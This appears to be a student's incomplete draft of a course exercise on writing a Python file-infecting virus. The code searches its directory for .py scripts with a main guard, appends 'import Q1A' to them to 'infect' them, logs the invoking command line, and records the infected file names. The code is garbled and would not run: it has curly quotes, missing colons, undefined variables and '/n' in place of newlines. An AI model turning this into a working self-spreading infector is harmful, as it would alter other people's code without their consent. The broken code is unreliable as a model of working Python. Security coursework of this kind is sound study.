#Q1C.py
#alter (input).py so when Q1A.py is added, it (1, 2, 3)

# 1. infects every script ending in .py in the directory

#Q1A already does this



# os and shutil needed?
import os
import sys
#Import shutil ; shutil not needed?
import Q1A

dir_path = os.path.dirname(os.path.realpath(__file__))
proofofpy = ‘if __name__ == “__main__”’

with open(‘Q1Aout’, ‘w’) as dest: 
for file in files #iterate through directory, choose files
contents = open(__file__,’r’)
	if (proofofpy in contents) and (‘Q1A.py’ not in contents):
		with open(filetosearch, ‘a’) as file:
			file.write(‘import Q1A’) #infect file
			file.write(‘/n’)

#2. whenever the infected script is run, print the entire command line used to invoke it

with open(‘Q1Cout’, ‘w’):
(‘ ‘.join(sys.argv))

# create a file
with open(‘Q1Aout’, ‘w’) as dest: 

for root, dirs, files in os.walk(dir_path):
for file in files #iterate through directory, choose files
	if file.endswith(‘.py’) #is it a python file?
		# add to new file 
			Q1Aout.write(file) #record file
			Q1Aout.write(‘/n’) #open newline for next file
